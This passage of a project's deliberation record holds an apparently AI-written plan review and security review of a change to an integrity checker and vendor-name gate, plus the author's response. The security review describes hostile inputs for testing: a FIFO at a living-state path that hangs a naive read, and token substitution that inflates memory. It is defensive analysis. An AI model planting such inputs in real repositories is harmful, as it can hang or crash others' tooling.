* **NU1's precedent.** The ledger (`:303`) says NU1, "the precedent (zero was reached in May and refilled within hours) and why zero should hold now", is checked in the CHANGELOG entry and the C7 log row. Neither criterion requires it: C7's log row is specified as the five rows at `:238` plus "the three limits of zero and the trigger", and the CHANGELOG bullet at `:455` lists what zero covers, the note and the issues. The accepted text asked for the precedent itself (the proposal's NU1 closure). Add one sentence to the C7 log-row criterion and to the Dispositions CHANGELOG bullet: `29ffeea6` reached `fail=0` on 2026-05-28, `dbc09557` refilled it that afternoon, and the two things that changed since (Boundary B runs the gate; `013847b6` bars reviewer credits in code).
* **The stale `verify_integrity.py:63-111` citations (`:85`).** The plan flags them "so that whoever next edits either comment re-points it" and gives them no home. C8 and C9 grow `verify_integrity.py` by well over a hundred lines, so the citations drift further, and one sits in a shipped, frozen template (`templates/modules/default-on/run_security_verification.py:128`). Do not widen to fix them (that would add a frozen file and its twin), but give the item a disposition: a board row, riding with the Q2 deferral batch, to re-point them by function name when either file is next edited.

**NU-PR7 -- Low -- The two items the author could not make checkable: the answers are mostly sound, with one correction.**
* **K5, "the reason survives" (`:170`).** The author's answer is sound: a reviewer reads before and after, because "did this comment carry an explanation" is a judgement and no script can make it a measurement. Two cheap changes make it a lookup instead of a memory test. The commit body should quote each reworded credit's old text beside the new text (commit bodies are not scanned by the gate), and say in code terms what the old comment explained. And the plan should note that the harm is recoverable: the old comments stay in `git log -p`, which is why the accepted text calls the cost cheap to undo.
* **"The note becomes noise" (`:463`).** The sentence joins two different signals. "The note names filled slots" is already guarded by C9: a filled slot is not listed, and the real-tree counts are checked against an independent count. Cite those nodes as the `guard`. "Adopters add `cairn:customized` by reflex" has no mechanism, and none exists, because Cairn sees adopters only through their issues. The author offers "a tracker class in an incident tracker, or `wontfix`". The first adds a new class to a shipped module (`incident-trackers.md`), which is scope no one accepted. The second is ruled out by the plan's own eligibility rule, since the signal reaches adopters. Decide now: a one-line watch on the board, riding with the Q2 deferral row the plan already deposits ("revisit if an adopter reports the note listing customized-by-reflex slots"), authorized by the same Decision quotation. Do not invent a tracker class.

**NU-PR8 -- Low -- C9 and D4 disagree, and D4 reshapes an accepted sentence.**
Evidence: D4 (`:96`) prints the warning and pointer "when the note lists at least one slot or counts at least one file as failed", and "a run with nothing to act on prints only the coverage line". C9 (`:264`) requires them "exactly once per run". Revision 4 says "Once per run, after the list" (proposal, Revision 4, first section). A pristine tree has no list, so D4's reading is the sensible one: a warning about recording an edit, printed when there is nothing to record, is the noise the accepted text itself worries about. Keep D4, but fix the two cells: C9 states both cases (exactly once when something is listed or a file failed; not at all otherwise, with a test for the second), and the Scope delta's "four things differ in mechanism" (`:351`) becomes five and names D4 so the Maintainer's allowance is not assumed.

**NU-PR9 -- Low -- C11 (#16's paragraph): carrying it here is right; two small changes.**
* **Carrying it is right.** The Decision says the paragraph is written as "a separate small change" and "#16 closes when it lands". The issue was closed first (measured), so the issue is no longer a home for the work, and a standalone change would need its own board row to avoid being lost. C11 is its own commit (`git show --stat` lists exactly two files), so it stays "separate". The plan correctly makes no GitHub change.
* **Placement of two sentences.** `:285` puts the paragraph inside the "Template content" quotation, which the scaffold merges into the adopter's docs guide. Two of the paragraph's duties are about Cairn, not the adopter: "no tool ships for this" and the three-recurrence revival rule. Keep the merged paragraph to the third category and the discipline (search the docs, README, changelog and docstrings for the old name in the same change; `dev/` history and a changelog may keep it), and put the "no tool ships" and revival sentences beside "The claim half is *not* shipped here" in the module's "Doctrine + tooling" section.
* **Order.** C11 depends on nothing. Run it early (after C1) so a stall in the security-heavy C8-C10 does not hold the paragraph, which the Maintainer already accepted.

### The author's eight open choices

| Choice | Verdict |
|---|---|
| D1 stderr, every line begins `slot note:` | Upheld. Matches the existing hint and lets the SR16 test separate the note's lines. |
| D2 `_slot_note` inside a fence | Upheld. |
| D3 runs on both exits, not on fail-closed early returns | Upheld. Revision 3 puts the call after the report and the fixed exit code; the early returns have nothing to read. |
| D4 warning and pointer only when there is something to act on | Upheld in substance; criterion and Scope delta wording corrected in NU-PR8. |
| D5 not-checked reasons, bad `tokens` never falls back to "no substitution" | Upheld. Matches Revision 3's four reasons and SR12. |
| D6 pointer to the heading, pinned by one test | Upheld. A code string naming a heading is not a link `check_cairn.py` resolves; the pointer lands on the verifier's side (SR15 closure). |
| D7 files in scope = non-verbatim records, living-state included | Upheld. |
| D8 `required(Internal + Internal Security Review)` | Upheld. A stronger bar than the proposal's header, not a weaker one; the surface (the lockfile reader adopters run, the neutrality boundary, two security scripts) is one `AGENTS.md` names for security treatment. |

### Answers to the two questions

**1. Does this plan deliver what the Decision accepted, all of it?** Yes. I walked the Decision's four answers, Revision 4's replacements, the parts of Revision 3 and Revision 2 it leaves standing, and SR12 and SR15-SR18 against the chunks. Every outcome maps to a chunk and a falsifiable criterion: the checker's four changes and five comments (C1); the 9, 38 and 3 shipped rewordings (C2-C5); the fixture credit, stale lines and markers (C6); the log and the zero claim with its limits (C7); the separate pass, its reader, the coverage line and the 17 hostile inputs (C8); the listing with no printed commands and the loop (C9); the guide's step, meaning, gap and section (C10); #16's paragraph (C11); Boundary B full (C12). Q2 is a `defer` the Decision authorized. Nothing is dropped. I found one accepted sentence reshaped (D4, NU-PR8), two accepted records the plan says it closes but whose criteria do not carry them (NU1's precedent, Q1(a); NU-PR6), and nothing added beyond the Decision that widens scope. What the plan adds are verification choices (K1-K7, the implementer's mutation ledger, the pointer test), which narrow nothing; the tracker class floated in Dispositions would add shipped-module scope and should not be adopted (NU-PR7).

**2. Is there a simpler path to the same outcome?** Not in structure. The accepted text has two independent halves, and I looked for a way to cut the work and found none that keeps an accepted outcome: the stricter checker, the 81 rewordings and markers, the note with its safe reader, and the guide are all accepted floor. The weight in C8 and C9 is inherited from four Security rounds (SR12's seven build details, the 17 inputs), and I would not trade it. What can come out is ceremony, not scope: K6 and K7 (NU-PR4), the repeated per-chunk K1-K4 records if C2-C4 merge, a commit for C7, and the dangling-pointer order of C9 and C10. Those are optional except the two instruments that are wrong as written (NU-PR1, NU-PR2).

### What I did not cover

* The Security reading of the plan: the safe reader, the fence, the no-commands rule, the `reviewer="agent"` change, and the marker reasons against the content scanner. That is the Internal Security Review's, and I did not duplicate it.
* I did not run the full suite or any of the plan's tests; Boundary B is the implementer's, and I only collected node counts.
* I did not re-run the two probes (`4ad1c115` install, fill, upgrade; the 17 figure), the independent count on a fresh `solo-greenfield` tree, or the plant table; they run at implementation.
* I did not check the 17 hostile inputs for completeness against the real lockfile shapes, or whether the proposed `os.O_*` handling works on every platform.
* I did not check the prose C10 asks for against `bootstrap/UPGRADE.md`, since it is not yet written, nor rewrite any of the six `docs/DOCUMENTATION_PLAN.md` lines to confirm each new statement is true.
* I did not read the proposal's History sections (the External review, its Response, Revisions 1-3's full text) beyond NU1, SR12 and the closures; earlier sections are history, as the brief said.
* I did not verify that the later plans' proposals ship no text the stricter checker would reject beyond the citations in NU-PR3; I searched them for line citations and for neutrality statements only. The combined review-stance-and-lenses plan was not yet committed.
* `claim_check.py` is run on this file at commit; I did not run `check_cairn.py`.

## Plan review -- Claude Opus 5.5 (Internal Security Review) -- 2026-10-18

```
Reviewed commit: b13ad7b72eb502565341c3b19aaf29ff63de2e70
Target: the whole plan, read for security: the C8-C9 slot note in bootstrap/verify_integrity.py, the C1 checker, the comment-only edits to the session kernel (C2), onboarding package (C3) and content scanner (C4), the frozen-file and re-anchor handling, and the security findings ledger against the proposal's SR1-SR18
Prior findings: none of this tier on the plan; the proposal's SR1-SR18 are read for how they were carried over, not reopened
Assurance path: high-assurance
```

**Obligation**: Internal Security Review
**Tier**: Internal Security Review
**Findings**: raised

**Model**: claude-opus-5-5

Distance: a fresh session of the author's agent type. I wrote neither the
proposal, any of its reviews, nor this plan. This pass runs beside the ordinary
Internal pass and does not repeat its scope-and-simplicity job.

### In plain terms

The plan is safe to build once six things are tightened. None needs a new
mechanism, an engine change or a Maintainer decision.

* **Every Security Review finding the proposal accepted made it into the
  plan.** I checked SR1 to SR18 one by one against the plan's criteria; none
  was lost.
* **The vendor-name check cannot be fooled by a marker inside `templates/`**,
  the folder that ships. I built the stricter checker from the plan's
  description and tried seven ways of hiding a name there with a marker; every
  one was caught.
* **One real gap: the new note reads the project's living files** (the roadmap,
  the handoff, the signed agreement) **straight from disk, and no test feeds
  them anything hostile.** These are the only files the note reads whose
  contents no fingerprint vouches for. If one of them were a special file that
  never finishes reading, a careless implementation would hang the integrity
  check forever. The plan's design avoids that, but nothing would notice if the
  code drifted from the design (NU-SR1).
* **Smaller items:** two shapes of oversized input the plan does not bound
  (NU-SR2); a check on the interpreter-binding code that will fail by
  construction as worded (NU-SR3); a promise about the pass-or-fail result that
  the planned test cannot fully see (NU-SR4); a frozen test file with no "add
  only, change nothing" rule, plus two ceremony facts the Maintainer should
  know (NU-SR5); and one sentence the "zero" claim should add (NU-SR6).

### The ledger: SR1-SR18 against the plan

Each finding's closing condition, from the proposal's Security Review passes and
the Responses and Revisions that answered them, read against the plan's criteria.

| Finding | Closing condition as accepted | Where the plan checks it | Carried over |
|---|---|---|---|
| SR1 | stricter scan; three `reviewer=` credits reworded; a search independent of the gate's matcher; plant table; blind spots named | C1 (8 nodes, superset check), C5 (credits), C7 (one-time search, plants), In brief item 1, S5 | yes |
| SR2 | false claims corrected; no remedy for a failing file; base copy hashed first | C8 (hash gate), C9 (first-install test, no commands) | yes; the remedy itself is superseded by SR15 |
| SR3 | separate pass after the verdict; accepted records only; never touches `violations`/`skipped`; regular file; errors become counts; modified file with unsafe `base_cache` still exits 1 | C8 (order, receives, fence, verdict comparison, "still fails on its own") | yes, with NU-SR1 and NU-SR4 |
| SR4 | `base_hash`; containment under `dev/.cairn/base/`; size cap; `ascii()` names | C8 (reader), C9 (printable ASCII) | yes |
| SR5 | marker only to keep Cairn's text; empty slots counted, not listed | C9 (what is listed, what the lines say) | yes |
| SR6 | no `nosec`/`noqa`/`pragma`/`type:`/encoding line added or removed | K2(b) with its control | yes |
| SR7 | two groups reworded, markers tight and declarative, scanner skip stated, `info=` recorded | C6, plan line 113 | yes |
| SR8 | superseded by SR15 | -- | yes (withdrawn, recorded) |
| SR9 | living-state files read and counted | C8 living-state bullet, C9 | partly: read and counted, but never fed hostile input (NU-SR1) |
| SR10 | "whole word, in the file types read"; joined spellings; substring search; five comment sites; decline recorded | In brief, C1, C7, ledger row | yes |
| SR11 | failing-file line points to UPGRADE.md | D4, D6, C10 | yes |
| SR12 | the seven build details | C8 (receives, reader, fence, per-record errors, no-op cases), C9 (printable names) | yes |
| SR13 | superset check; a directive carrying a name fails twice | C1 | yes |
| SR14 | the 12 and the 4; hashes equal the committed templates'; the 18 unchanged | K4, C7 | yes |
| SR15 | no printed command | C9 "No commands" | yes |
| SR16 | Case B scoped to the note's lines; guide leads with reading | C9, C10 | yes |
| SR17 | which copy; fill present; reading limit in S5 | C10 phrase list, S5 | yes |
| SR18 | hint and guide agree on history | landed `7c077ddf`; C9 guard | yes (verified: the hint at `bootstrap/verify_integrity.py:182-191` no longer offers history) |

Two notes on translation. Revision 4's loop test says the slot is "filled and
committed"; C9 drops "committed". That changes nothing a test proves, because
the scoped `--finalize` records the bytes on disk either way. And C8's 17 no-op
inputs carry every case SR3 and SR12 named; the gap in NU-SR1 is one SR9
created later, which none of the passes went back to.

### What I checked

Every run used `/Users/kendal30/conda_envs/lhm/bin/python3.13` (3.13.x) on a
detached `git worktree` of `b13ad7b7` in my scratchpad, never the shared tree.

* **The stricter checker.** I made C1's three code changes to a scratch copy of
  `scripts/quality_gate.py` (removed the two-line skip at `:278-279`, added
  `.json` and `.txt` to the `templates` entry, added the four names). It reads
  `fail=74 info=21` before and `fail=81 info=21` after, as the plan says.
* **Hiding a name behind a marker**, each plant alone on that 81 baseline:

  | Plant | fail | info |
  |---|---|---|
  | `templates/`: own-line `vendor-ok` above a name | +2 | +0 |
  | `templates/`: same-line `vendor-ok` on a name | +1 | +0 |
  | `templates/`: block markers around a name | +3 | +0 |
  | `templates/`: upper-case `VENDOR-OK` on a name | +1 | +0 |
  | `templates/`: `case-study` marker above a name | +2 | +0 |
  | `templates/`: a `.sh` file with a name | +0 | +0 |
  | `templates/`: an extensionless file with a name | +0 | +0 |
  | `docs/`: a second name added to a line that carries a marker | +0 | +2 |

  No marker inside `templates/` hides anything. The two `+0` file-type rows are
  the plan's named limit ("other file types"). The `docs/` row is the marker
  working as designed; see NU-SR6.
* **What ships.** All 97 rows of `python bootstrap/scaffold.py --manifest` take
  their source from under `templates/` (control: a known-absent path is
  reported). The shipped types are `.md`, `.py`, `.yml`, `.json`, `.txt` and
  one empty `.gitkeep`, so after C1 the checker reads every shipped type.
* **The comment-only edits.** Every one of the 33 denylist hits in the ten
  edited Python templates is a comment or a docstring, by the tokenizer and
  the parser; none is on line 1 or 2. None of those files reads `__doc__` or
  `getdoc` (control: the same search finds `__doc__` in three test files).
  All are mode `100644`. `tools/session.py` and its template are byte-identical
  today, and `bootstrap/tests/test_session_kernel.py:128` pins that.
* **The interpreter binding.** `_resolve_interpreter` (`tools/session.py:573-671`)
  and `encode_display` (`:169-199`) hold no hit. The functions that run the
  resolved path (`_intent_whoami`, `_surface_intents`, `_prune_intents`,
  `_run_evolution_infer`) hold none either. Two hits sit in docstrings of
  functions that obtain or route that path: `:905` in `cmd_session_start` and
  `:1338` in `cmd_session_end`. NU-SR3.
* **A FIFO at a living-state path.** On a minimal tree whose lockfile marks
  `dev/PLANNING.md` living-state, with a FIFO at that path, `verify_integrity`
  at `b13ad7b7` exits 0 at once, because it never opens living-state files. A
  plain `Path.read_bytes()` of the same path blocks (killed by a 5 s timeout,
  exit 124). `os.open` with `O_NONBLOCK|O_NOFOLLOW|O_NOCTTY` returns at once and
  `fstat` reports it is not a regular file. NU-SR1.
* **Input size.** Token substitution with the engine's own pattern
  (`bootstrap/_scaffold/slotmerge.py:37`), and the engine's per-name slot
  lookup (`_slot_body_in_text`, `:180`) against one marker pass. NU-SR2.
* **`ascii()` against the terminal encoder.** Over all 1,114,112 code points,
  `ascii()` never emits a character outside printable ASCII (control: `str()`
  of an ESC byte fails the same test). `encode_display` escapes 964,756 of
  them; `ascii()` escapes a superset.
* **The ceremony.** The gate anchor is `bd66a70c`; five commits since touch
  `bootstrap/verify_integrity.py`. I recomputed the frozen intersection both
  from the committed fixture and from `_frozen_files()` at `b13ad7b7`: 14 both
  ways, the same 14 the plan names. NU-SR5 covers what the count leaves out.
* **Merged output order and a broken stderr**, on a stand-in that has the
  plan's shape (report to stdout, note to stderr, fence). NU-SR4.

### The surfaces this pass probed

* **Can the note change pass or fail?** Not through the exit code `verify()`
  returns, as designed: the code is fixed before the call, the call is the last
  statement, and the fence catches `Exception` and `SystemExit`. Three gaps
  remain: a hang on an unhashed living file (NU-SR1), a hang or memory blow-up
  on a hostile lockfile (NU-SR2), and an edit to the integrity loop that the
  no-op comparison cannot see (NU-SR4).
* **Terminal escapes.** The plan uses Python's `ascii()`, not
  `encode_display`, and that is sound: `ascii()` is not a second escape table,
  it is stricter on every code point (measured above), and importing the
  session kernel into the trust anchor would add a non-engine import that
  `test_scaffold_substrate.py` exists to keep out. Its cost is readability: a
  non-ASCII path prints escaped. Cairn's shipped paths are ASCII. One sentence
  in C9 saying why `ascii()` and not `encode_display` would spare the code
  reviewer the question, given `AGENTS.md`'s "single terminal encoder" rule.
* **Symlinks and containment.** Sound for base copies: the per-component
  `lstat` walk, `O_NOFOLLOW` on the leaf, `fstat` on the same descriptor, and a
  race that only matters for bytes that must still match `base_hash`. Living
  files have no hash; NU-SR1.
* **Unbounded reads.** The note's reads are capped. The integrity pass's own
  read and the lockfile read stay uncapped (shipped behaviour, named in S5's
  Size line). The note adds two superlinear paths through lockfile-controlled
  data; NU-SR2.
* **"Prints no commands."** Holds for the note's own wording, and C9's test
  pins it. Slot names and paths are tree text: `ascii()` neutralises control
  bytes but leaves printable words, so a name could spell anything. Every name
  the note can print comes from a base copy that must match its lockfile
  `base_hash`, or is a lockfile `dst`. That is S5's "changed lockfile" residual,
  already named; nothing further is owed.
* **The kernel.** The plan's edits stay out of `_resolve_interpreter`,
  `encode_display` and the four functions that run the path. Twins are checked
  by K3 and by `test_session_kernel.py:128`. The protected-code criterion needs
  rewording; NU-SR3.
* **`content_scan.py` and the onboarding package.** K2 is the right instrument.
  Every hit is a comment or a docstring; K2(a) sees the `_OHM_SIGNS` string
  constants and the regex pieces around `:329`; K2(b) sees the comments tools
  obey. C5's before-and-after run of the scanner over the two security modules
  covers the `reviewer=` change.
* **The checker (C1).** It cannot be weakened by a marker inside `templates/`
  (measured above). Outside `templates/` a marker exempts by design, and no
  shipped file is sourced there. NU-SR6 asks that the "zero" sentence say so.
* **Frozen files and the oracle roster.** The count of 14 is right. Two things
  are missing; NU-SR5.
* **Is this the simplest safe design?** Within the accepted text, yes, with
  NU-SR4's smaller change to the integrity loop. One simpler design was not
  weighed by any pass: compare installed slots against the template in the
  checkout that runs the check, as the fork advisory already does with
  `trusted_upstream(CAIRN_ROOT)`, instead of against the adopter's base copy.
  That would remove the whole untrusted base-copy reader. It trades it for a
  version-skew gap whenever the checkout and the install differ, and it departs
  from the accepted text (Revision 3 item 2), so adopting it is a deviation for
  the Maintainer. I do not recommend it now. I record it so the next change to
  the note can weigh it.

### Findings

**[NU-SR1] (blocking) The only files the note reads that no hash vouches for are
never fed hostile input.** SR9 made the note read living-state files (the
roadmap, the handoff, the signed agreement, three configuration files) straight from
disk, because the integrity pass skips them. Every other byte the note parses
is either an installed file the integrity pass matched to its record or a base
copy that must match `base_hash`. Living files match nothing. They are also
written routinely, by people and agents.

* **Evidence.** C8's 17 no-op inputs (plan line 249) are all about
  `base_cache`, `base_hash`, `tokens` and installed bytes. The living-state
  bullet (line 253) is red only when a file is "neither read nor counted". The
  mutation ledger (line 398) has no living-state mutant. S5's race line (line
  449) covers `base_cache` only. Measured: with a FIFO at a living-state path,
  today's check exits 0 at once, because it never opens the path
  (`bootstrap/verify_integrity.py:133-136`), and a plain read of that path
  blocks until killed. So a living-state read written as
  `Path(...).read_bytes()` instead of through the shared reader would pass every
  listed test and hang the check on such a tree, after the report but before
  the exit code reaches the caller.
* **Recommended fix.**
  * Add living-state cases to the no-op comparison: a FIFO at a living-state
    path (under a timeout, like the `base_cache` FIFO), a symlinked leaf, a
    directory, over the cap, and not UTF-8. Each must show it reaches the note,
    as the 17 do.
  * Add the mutant "read living-state files without the shared reader", which
    the FIFO case must kill.
  * Say which containment the living reads take: the component walk the base
    copies get, or the integrity loop's `resolve()` containment
    (`bootstrap/verify_integrity.py:118-121`), which already runs before the
    living-state skip. Either is safe; the plan should name one and test it.
  * Extend S5's race line: a living read has no hash to bind it, and the race
    is harmless because the note prints only names from hash-bound base copies,
    plus counts.

**[NU-SR2] (non-blocking) Two pathological inputs are not bounded, and the
planned timing test may be flaky.** The cap bounds what is read. It does not
bound what substitution builds, or how slots are paired.

* **Token substitution multiplies size.** A base copy at the cap holds up to
  52,428 `{{a}}` tokens, and `tokens` values come from the lockfile, which is
  read uncapped (`bootstrap/_scaffold/lockfile.py:279-296`). With the engine's
  pattern, a 16 KiB value made 819 MiB in 0.4 s; a 1 MiB value would need about
  51 GiB, a hang or a killed process. D5 rejects only non-mapping and non-string
  tokens.
* **Pairing slots by name can be quadratic.** C9's linear test (line 261) times
  unclosed openers, which only the marker pass sees. Pairing base slots with
  installed slots is a second step. Done the way the engine's
  `_slot_body_in_text` does it (`bootstrap/_scaffold/slotmerge.py:180`), one
  search per name, it grew from 0.13 s to 1.86 s for 4x the slots. One marker
  pass over the same text took about 6 ms.
* **The ratio test.** At the cap my unclosed-opener run took 15 ms, and the
  quarter-size run's time ratio was 6.7, against the plan's limit of 8. A ratio
  of millisecond timings under a loaded full suite can trip.
* Both superlinear paths need a lockfile change, which S5 already concedes can
  steer the note; and the failure runs toward a stuck or failing run, never a
  false OK. That is why this does not block. But the plan claims the slot
  parsing stays linear, and it should be linear end to end.
* **Recommended fix.**
  * Bound substitution: skip and count as "unreadable" any body whose
    substituted length would exceed the cap. That length can be computed from
    the token counts before building the string.
  * State that pairing uses the one marker pass's name map, and extend the
    linear test to a cap-sized text of *closed* slots on both sides.
  * Use an absolute bound, as `test_unclosed_slots_cost_linear_time` does
    (`bootstrap/tests/test_verify_integrity.py:123-131`), or the best of several
    runs, instead of a single ratio.
  * Add a substitution case to the no-op comparison, with a size small enough
    to run fast.

**[NU-SR3] (non-blocking) C2's protected-code check fails by construction as
worded.** C2 (plan line 190) requires the `ast.dump` of `_resolve_interpreter`,
`encode_display` and "every function that executes the path" to be unchanged,
and says these "sit outside the three hit lines". Two of the three hits are in
docstrings of functions on that path: `tools/session.py:905` in
`cmd_session_start`, which calls `_resolve_interpreter` and hands the result to
`_surface_intents`, and `:1338` in `cmd_session_end`, which reaches
`_do_full_handoff`. A docstring is part of `ast.dump`. Rewording `:905` in a
scratch copy made the full dump of `cmd_session_start` read DIFFERENT; the
docstring-stripped dump read SAME, and every other function on the path read
SAME both ways. The implementer would face a red check or an improvised reading
of "executes", on a high-risk surface.

* **Recommended fix.** Name the set: `_resolve_interpreter`,
  `_probe_interpreter`, `encode_display`, `_intent_whoami`, `_surface_intents`,
  `_prune_intents`, `_run_evolution_infer`, `_do_full_handoff`,
  `cmd_session_start`, `cmd_session_end`. Require the full dump to be equal for
  all but the two that hold a hit. For those two, require the
  docstring-stripped dump to be equal and each diff hunk to lie inside the
  docstring's line span. Correct "These sit outside the three hit lines".

**[NU-SR4] (non-blocking) The verdict test cannot see an edit to the integrity
loop.** C8's comparison runs the new `verify()` with the note and with the note
replaced by a no-op (line 249). Both runs share the new integrity loop. To hand
the note "the accepted non-verbatim records with the bytes" and "a count of
in-scope records that did not pass" (line 247), the loop itself must change. If
the count is incremented in each failure branch, that is about six edits beside
`violations.append` and `continue`, the lines that decide the verdict. A
misplaced edit there changes the verdict in both runs alike, and the comparison
reads equal.

* **Recommended fix.**
  * Simplest: change the loop by two added lines only. Append the record and
    its bytes after the hash matches, and append the record before the
    living-state `continue`. Derive the failed count after the loop: in-scope
    records, minus those accepted, minus legitimate living ones. Add a
    criterion that the loop's diff adds lines and removes or changes none.
  * Add a differential check: the parent's `verify_integrity.py` and the new
    one, run on the same trees (the 17 cases, NU-SR1's cases, a fresh install
    and Cairn's own tree), must give the same exit code, the same stdout, and
    the same stderr once `slot note:` lines are removed. The throwaway worktree
    C8 already uses for "red at the parent" can run it.
* **Two smaller points on the same promise.**
  * **Flush before the note.** The verdict line goes to stdout, which Python
    buffers when it is piped; the note goes to stderr, which it does not. In a
    merged log the note arrives first. Measured on a stand-in with the plan's
    shape: `2>&1 | head -1` showed `slot note: ...`, and after a
    `sys.stdout.flush()` before the note it showed the verdict. C8's order test
    uses captured output, which cannot show this. Flush before the call, and
    test once through a subprocess with stderr merged.
  * **A broken stderr.** A run that passes today writes nothing to stderr. With
    the note it always does, so if stderr is a closed pipe the process exits 120
    instead of 0. Measured on the stand-in, with and without a guard on the
    fence's own print. Python's exit-time flush causes it, so no code fix
    applies. It only ever turns a pass into a failure. The In brief's "cannot
    change the check's pass or fail result" should say "the result `verify()`
    returns", and C10's bullet on what the note means can name this edge.

**[NU-SR5] (non-blocking) A frozen test has no "add only" rule, and two ceremony
facts are missing.** The re-anchor accepts whatever bytes the frozen files hold
at ceremony time. So the plan's own criteria are the only thing that keeps an
edit to a frozen test from weakening it.

* **`bootstrap/tests/test_verify_integrity.py` has no "additions only" rule.**
  C1 requires its test file's diff to be additions only (line 179). C8 and C9
  say no such thing for this frozen test, whose existing nodes pin the hint
  (`:81-89`) and the linear scan (`:123-131`). An existing assertion loosened to
  make room for the note's output would pass the suite. The gate manifest flags
  only dropped nodes and new skips. The re-anchor would then record it.
  *Fix*: C8 and C9 require the file's diff to add lines and remove none, and
  the base's 19 node IDs still to be collected.
* **Two edited files are phase-mutable, not frozen.** The gate manifest records
  `templates/modules/team-gated/intent.py` (C4) and
  `templates/modules/default-on/onboarding_activate.py` (C3) under
  `phase_mutable` (`bootstrap/tests/_gate_manifest.py:107`). A change to either
  yields a `PHASE-CHANGED` note, never a hold (`:697`). `intent.py` matches its
  recorded hash at the base, so C4 makes that note new; `onboarding_activate.py`
  already differs. Neither the *Frozen files* section nor the board row names
  them. *Fix*: one sentence in each, so the Maintainer expects the note.
* **The oracle does not test `verify_integrity`.** The ceremony holds any change
  to a roster path until the Maintainer's activation scope covers it
  (`bootstrap/tests/_oracle_activation.py:45`, `:136-197`). But the differential
  oracle does not run `verify_integrity`: it is single-engine and "covered by
  the unit suite" (`bootstrap/tests/_oracle.py:197-201`, `:402`). So when the
  Maintainer authorizes `bootstrap/verify_integrity.py` at the ceremony, the
  only evidence for C8-C9 is the unit suite and the code review. The plan's
  "covers it whether or not this plan runs" (line 73) is true of the hold; it
  should also say what evidence stands behind the authorization.

**[NU-SR6] (non-blocking) "Zero" should say that marked lines outside
`templates/` are exempt.** The In brief (line 16) says zero means no listed name
"in the file types the check reads". The check also reads `docs/`, `doctrine/`
and the fixture README. There a `vendor-ok` marker exempts its whole line or
block, and a name added there later moves `info=`, not `fail=` (measured above:
fail +0, info +2). Nothing compares `info=` from one run to the next. This is
by design, and those files do not ship. But the CHANGELOG entry and the C7 log
row state zero's limits for good, and they should not overstate them. *Fix*: add
to the stated limits that outside `templates/` a line or block that carries a
`vendor-ok` marker is exempt by design, that those files do not ship, and that
`info=` is the only sign of a name added under a marker.

### Verdict

**REVISE.** NU-SR1 blocks: it is the one place where the note's safety rests
on an untested assumption about tree bytes no hash vouches for, and the fix is
test cases and one mutant. NU-SR2 to NU-SR6 tighten criteria and wording and
can be answered in the same revision. Status moves to `revising-plan`. No
question for the Maintainer: every fix stays within the accepted text.

### What I did not cover

* **I did not build the note.** Everything about C8-C9 is read from the plan
  and tested on stand-ins and on the shipped engine's own functions, not on the
  implementation, which does not exist yet. Boundary C owns that.
* **I did not run the full suite or any acceptance criterion's command.** They
  check the implementation; there is none yet.
* **I did not read the content of the 33 Python rewordings**, which are not
  written yet; I classified the hit lines they will change.
* **Windows and other non-POSIX platforms.** The `getattr(os, ..., 0)` flags
  degrade to 0 there; I took `docs/quickstart.md`'s POSIX scope as given and
  did not test it.
* **Unicode look-alikes in names** (a Cyrillic letter inside "Claude") were not
  planted. They fall under the plan's named "hiding a name on purpose" limit.
* **The ordinary Internal review's ground**: chunk sizing, sequencing with
  later plans, prose quality, and whether C9's "Two real trees" figures are
  right.
* **The C10 guide text, as an adopter would read it cold.** I checked that its
  required phrases match SR17, not how it reads.


## Response to plan review -- Claude Sonnet 5.5 (author) -- 2026-10-18

This answers the Internal plan review (`0389a14e`, NU-PR1 to NU-PR9) and the Internal Security Review (`e4eafbc8`, NU-SR1 to NU-SR6), both of reviewed commit `b13ad7b7`. I checked each finding against the tree at `69d3ac59` before folding it, and reproduced the measurements the fixes rest on: the widened comment grep prints five lines (one per site) where the original printed three; `templates/modules/team-gated/intent.py` matches its recorded phase-mutable hash and `templates/modules/default-on/onboarding_activate.py` does not; the ten interpreter-binding functions exist, and the two docstring hits sit inside `cmd_session_start` and `cmd_session_end`; and the new comparison script reads SAME for a reworded docstring and DIFFERENT for a changed comment-in-body, a changed line of code, and a changed `_resolve_interpreter` (on scratch copies). All fifteen findings are answered: fourteen accepted, one in part (NU-PR4). Each is answered in an operative cell above, as the template asks, and this table points at them. Both reviews' sections stand unedited.

**What changed since the plan opened.**

* The combined plan `review-stance-and-lenses` (opened at `8cc124b5`) now holds the stance and lenses proposals and recommends going third. I re-checked this plan's shared-file list against its *Sequencing with the other work* section: *Sequence* > "Sequencing with the later plans" now names it in place of the two proposals. Its edits to `solo-greenfield.md`, the session-start skill pair, the three prose files, `bootstrap/UPGRADE.md` and the lockfile are in different sentences or sections from mine, as before. Its criterion that needs `test_onboarding_review_tiers.py` passing is the reason C runs first, and C5 says this is that test's last run.
* `stewardship-and-reuse` (issue #30, in revision) cites `scripts/quality_gate.py:498` and `doctrine/rationale.md:407-431` and `:447`. `board-as-basis` still cites `templates/skills/session-start/SKILL.md:43-45`. *Scope* > "Found while planning" lists all four and C1, C2 and C6 guard them.
* `69d3ac59` changed `AGENTS.md`'s sentence on a deleted frozen file. Nothing in this plan relies on the old wording.

| Finding | Disposition | Where |
|---|---|---|
| NU-PR1 C7's search would fail on C1 | accepted | *Acceptance criteria* > C7, "The one-time search": `<base>` is `b13ad7b7`, the checker's two files, the log rows and the deliberation records are excluded with the reason, and C12 repeats it. |
| NU-PR2 C1's comment check passes with two sites wrong | accepted | *Acceptance criteria* > C1, "The five comment sites": the grep is `directive-forbidden\|Not bootstrap/tests/`, five lines at the parent, one per site, and the commit body quotes all five before and after. |
| NU-PR3 later plans cite lines the plan moves | accepted | *Acceptance criteria* > C2 (the file's line count unchanged, both copies) and C5 (the same for `solo-greenfield.md`); C1 records the new line of `_R1_SCAN_ROOTS`; *Scope* > "Found while planning" lists the live citations, including two the review could not have seen (the #30 proposal's); *Sequence* > the later-plans table has the `scripts/quality_gate.py` row. |
| NU-PR4 ceremony that buys nothing; optional merges | accepted in part | **Accepted:** K7 and K6 are dropped from *Acceptance criteria* > "Checks every rewording chunk repeats", K7 replaced by a recorded fact (`grep -c cairn:slot` is 0 on each Markdown template, control returning 3); C10 runs before C9; C2-C4 may land as one commit; M is a paragraph under the table. All in *Sequence*. **Declined:** folding C7 into C6. C7 is the first commit at which the gate reads zero, so one `git show` anchors the claim and the log rows; the merge saves one commit and loses that anchor (*Sequence* > "Run order and commits"). |
| NU-PR5 two checks that cannot be done exactly | accepted | *In brief* says "comments and docstrings"; K2(d) records the `__doc__` search with a control; C6 says "each marker and the one space before it". |
